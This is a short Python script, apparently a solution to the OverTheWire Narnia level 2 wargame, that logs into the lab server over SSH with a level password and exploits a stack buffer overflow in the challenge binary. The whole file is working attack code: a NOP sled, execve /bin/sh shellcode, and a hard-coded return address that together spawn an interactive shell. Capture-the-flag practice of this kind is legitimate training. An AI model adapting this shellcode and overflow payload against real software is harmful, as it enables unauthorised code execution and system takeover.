# Overthewire: Narnia 2
# woanmeo11
# fuck python3

from pwn import *

s = ssh(host='narnia.labs.overthewire.org', user='narnia2', password='nairiepecu', port=2226)

shellcode = b'\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'
ret_addr = p32(0xffffddec)
payload = b'\x90'*108 + shellcode + ret_addr

s = s.process(['/narnia/narnia2', payload])

s.interactive()
